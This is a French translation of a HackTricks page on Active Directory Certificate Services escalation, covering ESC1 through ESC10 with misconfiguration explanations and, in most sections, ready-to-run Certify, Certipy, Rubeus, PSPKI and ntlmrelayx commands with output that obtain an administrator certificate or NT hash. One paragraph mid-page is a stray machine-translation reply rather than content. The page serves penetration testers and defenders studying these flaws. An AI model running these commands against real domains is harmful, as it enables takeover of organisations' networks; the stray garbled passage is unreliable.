# Escalade de domaine AD CS

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Modèles de certificats mal configurés - ESC1

### Explication

* L'**Enterprise CA** accorde aux **utilisateurs à faibles privilèges des droits d'inscription**
* **L'approbation du gestionnaire est désactivée**
* **Aucune signature autorisée n'est requise**
* Un **modèle de certificat** trop permissif **accorde des droits d'inscription de certificat aux utilisateurs à faibles privilèges**
* Le **modèle de certificat définit des EKUs qui permettent l'authentification** :
* _Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), ou pas d'EKU (SubCA)._
* Le **modèle de certificat permet aux demandeurs de spécifier un subjectAltName dans la CSR :**
* **AD** **utilisera** l'identité spécifiée par le champ **subjectAltName** (SAN) d'un certificat **si** elle est **présente**. Par conséquent, si un demandeur peut spécifier le SAN dans une CSR, le demandeur peut **demander un certificat en tant que n'importe qui** (par exemple, un utilisateur admin de domaine). L'objet AD du modèle de certificat **spécifie** si le demandeur **peut spécifier le SAN** dans sa propriété **`mspki-certificate-name-`**`flag`. La propriété `mspki-certificate-name-flag` est un **masque de bits** et si le drapeau **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** est **présent**, un **demandeur peut spécifier le SAN.**

{% hint style="danger" %}
Ces paramètres permettent à un **utilisateur à faibles privilèges de demander un certificat avec un SAN arbitraire**, permettant à l'utilisateur à faibles privilèges de s'authentifier en tant que n'importe quel principal dans le domaine via Kerberos ou SChannel.
{% endhint %}

Ceci est souvent activé, par exemple, pour permettre aux produits ou services de déploiement de générer des certificats HTTPS ou des certificats d'hôte à la volée. Ou par manque de connaissance.

Notez que lorsqu'un certificat avec cette dernière option est créé, un **avertissement apparaît**, mais il n'apparaît pas si un **modèle de certificat** avec cette configuration est **dupliqué** (comme le modèle `WebServer` qui a `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé et ensuite l'administrateur peut ajouter un OID d'authentification).

### Abus

Pour **trouver des modèles de certificats vulnérables**, vous pouvez exécuter :
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
Pour **abuser de cette vulnérabilité pour se faire passer pour un administrateur**, on pourrait exécuter :
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Ensuite, vous pouvez transformer le **certificat généré en format `.pfx`** et l'utiliser pour **vous authentifier à nouveau en utilisant Rubeus ou certipy** :
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Les binaires Windows "Certreq.exe" et "Certutil.exe" peuvent être détournés pour générer le PFX : https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

De plus, la requête LDAP suivante, lorsqu'elle est exécutée contre le schéma de configuration de la forêt AD, peut être utilisée pour **énumérer** les **modèles de certificats** qui **ne nécessitent pas d'approbation/signatures**, qui possèdent une EKU **Authentification Client ou Connexion par Carte à Puce**, et ont le drapeau **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** activé :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modèles de certificats mal configurés - ESC2

### Explication

Le deuxième scénario d'abus est une variation du premier :

1. L'Enterprise CA accorde aux utilisateurs disposant de faibles privilèges le droit de s'inscrire.
2. L'approbation du gestionnaire est désactivée.
3. Aucune signature autorisée n'est requise.
4. Un descripteur de sécurité de modèle de certificat trop permissif accorde aux utilisateurs disposant de faibles privilèges le droit de s'inscrire pour obtenir un certificat.
5. **Le modèle de certificat définit l'EKU Any Purpose ou aucun EKU.**

L'**EKU Any Purpose** permet à un attaquant d'obtenir un **certificat** pour **n'importe quel objectif** comme l'authentification client, l'authentification serveur, la signature de code, etc. La même **technique que pour ESC3** peut être utilisée pour abuser de cela.

Un **certificat sans EKUs** — un certificat de CA subordonné — peut également être abusé pour **n'importe quel objectif**, mais pourrait **aussi être utilisé pour signer de nouveaux certificats**. Ainsi, en utilisant un certificat de CA subordonné, un attaquant pourrait **spécifier des EKUs arbitraires ou des champs dans les nouveaux certificats.**

Cependant, si le **CA subordonné n'est pas approuvé** par l'objet **`NTAuthCertificates`** (ce qui ne sera pas le cas par défaut), l'attaquant **ne peut pas créer de nouveaux certificats** qui fonctionneront pour **l'authentification de domaine**. Néanmoins, l'attaquant peut créer **de nouveaux certificats avec n'importe quel EKU** et des valeurs de certificat arbitraires, dont il y a **abondance** que l'attaquant pourrait potentiellement **abuser** (par exemple, la signature de code, l'authentification serveur, etc.) et qui pourraient avoir de grandes implications pour d'autres applications dans le réseau comme SAML, AD FS ou IPSec.

La requête LDAP suivante, lorsqu'elle est exécutée contre le schéma de configuration de la forêt AD, peut être utilisée pour énumérer les modèles correspondant à ce scénario :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modèles d'agents d'inscription mal configurés - ESC3

### Explication

Ce scénario est similaire au premier et au deuxième, mais **exploite** un **EKU différent** (Agent de demande de certificat) et **2 modèles différents** (il a donc 2 ensembles d'exigences),

L'**EKU Agent de demande de certificat** (OID 1.3.6.1.4.1.311.20.2.1), connu sous le nom d'**Agent d'inscription** dans la documentation de Microsoft, permet à un principal de **s'inscrire** pour un **certificat** **au nom d'un autre utilisateur**.

L'**"agent d'inscription"** s'inscrit à un tel **modèle** et utilise le **certificat résultant pour cosigner une CSR au nom de l'autre utilisateur**. Il **envoie** ensuite la **CSR cosignée** à l'AC, en s'inscrivant à un **modèle** qui **permet de "s'inscrire au nom de"**, et l'AC répond avec un **certificat appartenant à l'"autre" utilisateur**.

**Exigences 1 :**

1. L'AC d'entreprise permet aux utilisateurs peu privilégiés des droits d'inscription.
2. L'approbation du gestionnaire est désactivée.
3. Aucune signature autorisée n'est requise.
4. Un descripteur de sécurité de modèle de certificat trop permissif permet aux utilisateurs peu privilégiés des droits d'inscription au certificat.
5. Le **modèle de certificat définit l'EKU Agent de demande de certificat**. L'OID de l'Agent de demande de certificat (1.3.6.1.4.1.311.20.2.1) permet de demander d'autres modèles de certificats au nom d'autres principaux.

**Exigences 2 :**

1. L'AC d'entreprise permet aux utilisateurs peu privilégiés des droits d'inscription.
2. L'approbation du gestionnaire est désactivée.
3. **La version du schéma du modèle est 1 ou supérieure à 2 et spécifie une exigence de politique d'application d'émission nécessitant l'EKU Agent de demande de certificat.**
4. Le modèle de certificat définit un EKU qui permet l'authentification de domaine.
5. Les restrictions d'agent d'inscription ne sont pas mises en œuvre sur l'AC.

### Abus

Vous pouvez utiliser [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) pour exploiter ce scénario :
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Les AC d'entreprise peuvent **restreindre** les **utilisateurs** qui peuvent **obtenir** un **certificat d'agent d'inscription**, les modèles dans lesquels les **agents d'inscription peuvent s'inscrire**, et quels **comptes** l'agent d'inscription peut **représenter** en ouvrant le `certsrc.msc` `snap-in -> clic droit sur l'AC -> cliquer sur Propriétés -> naviguer` jusqu'à l'onglet “Enrollment Agents”.

Cependant, le paramètre **par défaut** de l'AC est “**Ne pas restreindre les agents d'inscription**”. Même lorsque les administrateurs activent “Restreindre les agents d'inscription”, le paramètre par défaut est extrêmement permissif, permettant à tout le monde de s'inscrire dans tous les modèles en tant que n'importe qui.

## Contrôle d'accès vulnérable au modèle de certificat - ESC4

### **Explication**

Les **modèles de certificats** ont un **descripteur de sécurité** qui spécifie quels **principaux AD** ont des **permissions spécifiques sur le modèle**.

Si un **attaquant** a suffisamment de **permissions** pour **modifier** un **modèle** et **créer** l'une des **mauvaises configurations exploitables** des **sections précédentes**, il pourra l'exploiter et **escalader les privilèges**.

Droits intéressants sur les modèles de certificats :

* **Propriétaire :** Contrôle total implicite de l'objet, peut modifier toutes les propriétés.
* **FullControl :** Contrôle total de l'objet, peut modifier toutes les propriétés.
* **WriteOwner :** Peut modifier le propriétaire pour un principal contrôlé par l'attaquant.
* **WriteDacl :** Peut modifier le contrôle d'accès pour accorder à un attaquant FullControl.
* **WriteProperty :** Peut modifier toutes les propriétés

### Abus

Un exemple de privesc comme celui mentionné précédemment :

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 est lorsque un utilisateur a des privilèges d'écriture sur un modèle de certificat. Cela peut par exemple être abusé pour réécrire la configuration du modèle de certificat pour rendre le modèle vulnérable à ESC1.

Comme nous pouvons le voir dans le chemin ci-dessus, seul `JOHNPC` a ces privilèges, mais notre utilisateur `JOHN` a le nouveau lien `AddKeyCredentialLink` vers `JOHNPC`. Puisque cette technique est liée aux certificats, j'ai également implémenté cette attaque, connue sous le nom de [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Voici un petit aperçu de la commande `shadow auto` de Certipy pour récupérer le hash NT de la victime.

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy** peut réécrire la configuration d'un modèle de certificat avec une seule commande. **Par défaut**, Certipy va **réécrire** la configuration pour la rendre **vulnérable à ESC1**. Nous pouvons également spécifier le paramètre **`-save-old` pour sauvegarder l'ancienne configuration**, ce qui sera utile pour **restaurer** la configuration après notre attaque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Contrôle d'accès vulnérable aux objets PKI - ESC5

### Explication

La toile de relations ACL interconnectées qui peuvent affecter la sécurité de AD CS est vaste. Plusieurs **objets en dehors des modèles de certificats** et de l'autorité de certification elle-même peuvent avoir un **impact sur la sécurité de l'ensemble du système AD CS**. Ces possibilités incluent (sans s'y limiter) :

* **L'objet ordinateur AD du serveur CA** (par exemple, compromission via S4U2Self ou S4U2Proxy)
* **Le serveur RPC/DCOM du serveur CA**
* Tout **objet AD descendant ou conteneur dans le conteneur** `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` (par exemple, le conteneur des modèles de certificats, le conteneur des autorités de certification, l'objet NTAuthCertificates, le conteneur des services d'inscription, etc.)

Si un attaquant avec peu de privilèges peut **prendre le contrôle de l'un de ces éléments**, l'attaque peut probablement **compromettre le système PKI**.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explication

Il existe un autre problème similaire, décrit dans l'[**article de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), qui concerne le drapeau **`EDITF_ATTRIBUTESUBJECTALTNAME2`**. Comme Microsoft le décrit, "**Si** ce drapeau est **activé** sur le CA, **toute demande** (y compris lorsque le sujet est construit à partir d'Active Directory®) peut avoir des **valeurs définies par l'utilisateur** dans le **nom alternatif du sujet**."\
Cela signifie qu'un **attaquant** peut s'inscrire dans **N'IMPORTE QUEL modèle** configuré pour l'**authentification de domaine** qui **permet également aux utilisateurs non privilégiés** de s'inscrire (par exemple, le modèle d'utilisateur par défaut) et **obtenir un certificat** qui lui permet de **s'authentifier** en tant qu'administrateur de domaine (ou **tout autre utilisateur/machine actif**).

**Note** : les **noms alternatifs** ici sont **inclus** dans une CSR via l'argument `-attrib "SAN:"` pour `certreq.exe` (c'est-à-dire "Paires Nom Valeur"). C'est **différent** de la méthode pour **abuser des SANs** dans ESC1 car cela **stocke les informations de compte dans un attribut de certificat vs une extension de certificat**.

### Abus

Les organisations peuvent **vérifier si le paramètre est activé** en utilisant la commande suivante `certutil.exe` :
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Sous le capot, cela utilise simplement **remote** **registry**, donc la commande suivante pourrait également fonctionner :
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) et [**Certipy**](https://github.com/ly4k/Certipy) vérifient également cela et peuvent être utilisés pour abuser de cette mauvaise configuration :
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Ces paramètres peuvent être **définis**, en supposant des droits **administratifs de domaine** (ou équivalents), à partir de n'importe quel système :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Si vous trouvez ce paramètre dans votre environnement, vous pouvez **retirer ce drapeau** avec :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Après les mises à jour de sécurité de mai 2022, les nouveaux **certificats** auront une **extension de sécurité** qui **intègre** la propriété **`objectSid` du demandeur**. Pour ESC1, cette propriété sera reflétée à partir du SAN spécifié, mais avec **ESC6**, cette propriété reflète **l'`objectSid` du demandeur**, et non à partir du SAN.\
Ainsi, **pour abuser de ESC6**, l'environnement doit être **vulnérable à ESC10** (Mappages de certificats faibles), où le **SAN est préféré à la nouvelle extension de sécurité**.
{% endhint %}

## Contrôle d'accès vulnérable de l'Autorité de Certification - ESC7

### Attaque 1

#### Explication

Une autorité de certification elle-même a un **ensemble de permissions** qui sécurisent diverses **actions de CA**. Ces permissions peuvent être accédées depuis `certsrv.msc`, en cliquant droit sur une CA, en sélectionnant propriétés, et en passant à l'onglet Sécurité :

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

Cela peut également être énuméré via le [**module PSPKI**](https://www.pkisolutions.com/tools/pspki/) avec `Get-CertificationAuthority | Get-CertificationAuthorityAcl`:
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
#### Abus

Si vous avez un principal avec les droits **`ManageCA`** sur une **autorité de certification**, nous pouvons utiliser **PSPKI** pour changer à distance le bit **`EDITF_ATTRIBUTESUBJECTALTNAME2`** pour **permettre la spécification SAN** dans n'importe quel modèle ([ECS6](domain-escalation.md#editf_attributesubjectaltname2-esc6)) :

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

Cela est également possible de manière plus simple avec l'applet de commande [**PSPKI’s Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx).

Les droits **`ManageCertificates`** permettent d'**approuver une demande en attente**, contournant ainsi la protection "approbation du gestionnaire de certificats CA".

Vous pouvez utiliser une **combinaison** des modules **Certify** et **PSPKI** pour demander un certificat, l'approuver et le télécharger :
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### Attaque 2

#### Explication

{% hint style="warning" %}
Dans **l'attaque précédente**, les permissions **`Manage CA`** étaient utilisées pour **activer** le drapeau **EDITF\_ATTRIBUTESUBJECTALTNAME2** afin de réaliser l'**attaque ESC6**, mais cela n'aura aucun effet tant que le service CA (`CertSvc`) n'est pas redémarré. Lorsqu'un utilisateur possède le droit d'accès `Manage CA`, il est également autorisé à **redémarrer le service**. Cependant, cela **ne signifie pas que l'utilisateur peut redémarrer le service à distance**. De plus, l'**ESC6 pourrait ne pas fonctionner immédiatement** dans la plupart des environnements mis à jour en raison des mises à jour de sécurité de mai 2022.
{% endhint %}

Par conséquent, une autre attaque est présentée ici.

Prérequis :

* Permission **`ManageCA`** uniquement
* Permission **`Manage Certificates`** (peut être accordée depuis **`ManageCA`**)
* Le modèle de certificat **`SubCA`** doit être **activé** (peut être activé depuis **`ManageCA`**)

La technique repose sur le fait que les utilisateurs avec les droits d'accès `Manage CA` _et_ `Manage Certificates` peuvent **émettre des demandes de certificats échouées**. Le modèle de certificat **`SubCA`** est **vulnérable à l'ESC1**, mais **seuls les administrateurs** peuvent s'inscrire au modèle. Ainsi, un **utilisateur** peut **demander** à s'inscrire au **`SubCA`** - ce qui sera **refusé** - mais **ensuite émis par le gestionnaire par la suite**.

#### Abus

Vous pouvez vous **octroyer le droit d'accès `Manage Certificates`** en ajoutant votre utilisateur comme un nouvel officier.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Le modèle **`SubCA`** peut être **activé sur le CA** avec le paramètre `-enable-template`. Par défaut, le modèle `SubCA` est activé.
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si nous avons rempli les prérequis pour cette attaque, nous pouvons commencer par **demander un certificat basé sur le modèle `SubCA`**.

**Cette demande sera refusée**, mais nous sauvegarderons la clé privée et noterons l'ID de la demande.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Avec nos **`Manage CA` et `Manage Certificates`**, nous pouvons ensuite **émettre la demande de certificat échouée** avec la commande `ca` et le paramètre `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Et finalement, nous pouvons **récupérer le certificat émis** avec la commande `req` et le paramètre `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## Relais NTLM vers les points de terminaison HTTP AD CS – ESC8

### Explication

{% hint style="info" %}
En résumé, si un environnement a **AD CS installé**, avec un **point de terminaison d'inscription web vulnérable** et au moins un **modèle de certificat publié** qui permet **l'inscription d'ordinateurs de domaine et l'authentification client** (comme le modèle par défaut **`Machine`**), alors un **attaquant peut compromettre N'IMPORTE QUEL ordinateur avec le service spouleur en cours d'exécution**!
{% endhint %}

AD CS prend en charge plusieurs **méthodes d'inscription basées sur HTTP** via des rôles de serveur AD CS supplémentaires que les administrateurs peuvent installer. Ces interfaces d'inscription de certificats basées sur HTTP sont toutes **vulnérables aux attaques de relais NTLM**. En utilisant le relais NTLM, un attaquant sur une **machine compromise peut se faire passer pour n'importe quel compte AD s'authentifiant via NTLM entrant**. En se faisant passer pour le compte victime, un attaquant pourrait accéder à ces interfaces web et **demander un certificat d'authentification client basé sur les modèles de certificat `User` ou `Machine`**.

* L'**interface d'inscription web** (une application ASP de l'ancienne génération accessible à `http://<caserver>/certsrv/`), par défaut, ne prend en charge que HTTP, qui ne peut pas se protéger contre les attaques de relais NTLM. De plus, elle permet explicitement uniquement l'authentification NTLM via son en-tête HTTP Authorization, donc des protocoles plus sécurisés comme Kerberos ne sont pas utilisables.
* Le **Certificate Enrollment Service** (CES), le **Certificate Enrollment Policy** (CEP) Web Service et le **Network Device Enrollment Service** (NDES) prennent en charge l'authentification négociée par défaut via leur en-tête HTTP Authorization. L'authentification négociée **supporte** Kerberos et **NTLM** ; par conséquent, un attaquant peut **négocier pour utiliser l'authentification NTLM** pendant les attaques de relais. Ces services web activent au moins HTTPS par défaut, mais malheureusement HTTPS à lui seul ne **protège pas contre les attaques de relais NTLM**. Seulement lorsque HTTPS est couplé avec le binding de canal, les services HTTPS peuvent être protégés contre les attaques de relais NTLM. Malheureusement, AD CS n'active pas la Protection Étendue pour l'Authentification sur IIS, qui est nécessaire pour activer le binding de canal.

Les **problèmes** courants avec les attaques de relais NTLM sont que les **sessions NTLM sont généralement courtes** et que l'attaquant **ne peut pas** interagir avec les services qui **imposent la signature NTLM**.

Cependant, abuser d'une attaque de relais NTLM pour obtenir un certificat pour l'utilisateur résout ces limitations, car la session vivra aussi longtemps que le certificat est valide et le certificat peut être utilisé pour utiliser des services **imposant la signature NTLM**. Pour savoir comment utiliser un cert volé, consultez :

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Une autre limitation des attaques de relais NTLM est qu'elles **nécessitent qu'un compte victime s'authentifie sur une machine contrôlée par l'attaquant**. Un attaquant pourrait attendre ou essayer de **forcer** cela :

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abus**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify)’s `cas` command can enumerate **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Les autorités de certification d'entreprise stockent également **les points de terminaison CES** dans leur objet AD dans la propriété `msPKI-Enrollment-Servers`. **Certutil.exe** et **PSPKI** peuvent analyser et lister ces points de terminaison :
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
Since there is no English text provided outside of the HTML and markdown syntax, there is nothing to translate. If you have specific English text that you would like translated into French, please provide it, and I will be happy to assist.
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Abus avec Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abus avec [Certipy](https://github.com/ly4k/Certipy)

Par défaut, Certipy demandera un certificat basé sur le modèle `Machine` ou `User` selon que le nom du compte relayé se termine par `$`. Il est possible de spécifier un autre modèle avec le paramètre `-template`.

Nous pouvons ensuite utiliser une technique telle que [PetitPotam](https://github.com/ly4k/PetitPotam) pour forcer l'authentification. Pour les contrôleurs de domaine, nous devons spécifier `-template DomainController`.
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Pas d'extension de sécurité - ESC9 <a href="#5485" id="5485"></a>

### Explication

ESC9 fait référence à la nouvelle valeur **`msPKI-Enrollment-Flag`** **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`). Si ce drapeau est défini sur un modèle de certificat, la **nouvelle extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`** ne sera **pas** intégrée. ESC9 est seulement utile lorsque `StrongCertificateBindingEnforcement` est réglé sur `1` (par défaut), puisqu'une configuration de mappage de certificat plus faible pour Kerberos ou Schannel peut être exploitée comme ESC10 — sans ESC9 — car les exigences seront les mêmes.

* `StrongCertificateBindingEnforcement` n'est pas réglé sur `2` (par défaut : `1`) ou `CertificateMappingMethods` contient le drapeau `UPN`
* Le certificat contient le drapeau `CT_FLAG_NO_SECURITY_EXTENSION` dans la valeur `msPKI-Enrollment-Flag`
* Le certificat spécifie n'importe quel EKU d'authentification client
* `GenericWrite` sur n'importe quel compte A pour compromettre n'importe quel compte B

### Abus

Dans ce cas, `John@corp.local` a `GenericWrite` sur `Jane@corp.local`, et nous souhaitons compromettre `Administrator@corp.local`. `Jane@corp.local` est autorisée à s'inscrire au modèle de certificat `ESC9` qui spécifie le drapeau `CT_FLAG_NO_SECURITY_EXTENSION` dans la valeur `msPKI-Enrollment-Flag`.

D'abord, nous obtenons le hash de `Jane` avec par exemple Shadow Credentials (en utilisant notre `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

Ensuite, nous changeons le `userPrincipalName` de `Jane` pour qu'il soit `Administrator`. Remarquez que nous omettons la partie `@corp.local`.

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

Ceci n'est pas une violation de contrainte, puisque le `userPrincipalName` de l'utilisateur `Administrator` est `Administrator@corp.local` et non `Administrator`.

Maintenant, nous demandons le modèle de certificat vulnérable `ESC9`. Nous devons demander le certificat en tant que `Jane`.

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

Remarquez que le `userPrincipalName` dans le certificat est `Administrator` et que le certificat émis ne contient pas de "object SID".

Ensuite, nous changeons à nouveau le `userPrincipalName` de `Jane` pour être autre chose, comme son `userPrincipalName` original `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

Maintenant, si nous essayons de nous authentifier avec le certificat, nous recevrons le hash NT de l'utilisateur `Administrator@corp.local`. Vous devrez ajouter `-domain <domain>` à votre ligne de commande puisqu'il n'y a pas de domaine spécifié dans le certificat.

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Mappages de certificats faibles - ESC10

### Explication

ESC10 fait référence à deux valeurs de clé de registre sur le contrôleur de domaine.

